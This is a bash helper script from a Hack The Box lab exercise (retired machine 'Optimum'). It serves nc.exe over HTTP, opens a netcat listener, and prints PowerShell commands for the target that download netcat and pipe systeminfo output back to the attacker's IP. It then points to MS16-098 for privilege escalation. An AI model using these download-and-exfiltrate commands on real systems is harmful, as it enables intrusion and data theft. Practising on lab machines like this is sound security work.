#!/bin/bash

source /root/.yaes.conf

current_dir=$( pwd )
local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )

# serve static netcat.exe
cd /root/infosec/static-binaries/windows/x86

python -m SimpleHTTPServer ${web_port} &

cd /root/infosec/workspace/htb/retired/optimum/
nc -lnvp 9876 > systeminfo.log &

sleep 2
echo "download netcat to host, set up local netcat listener to accept input from systeminfo, feed it to windows-exploit-suggester!"
echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/nc.exe' -OutFile 'nc.exe'}\""
echo "set PATH=%PATH%;%CD% && powershell.exe -Command \"systeminfo | nc.exe 10.10.16.10 9876\""
echo "powershell.exe -Command \"systeminfo | nc ${local_ip} 9876\""
echo "closing in 120 seconds..."
sleep 120
ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
cd ${current_dir}

known_reliable_exploits=( "MS16-098" )
echo "seems like found possible reliable exploit... serving exploit over http, download it and execute for victory!"
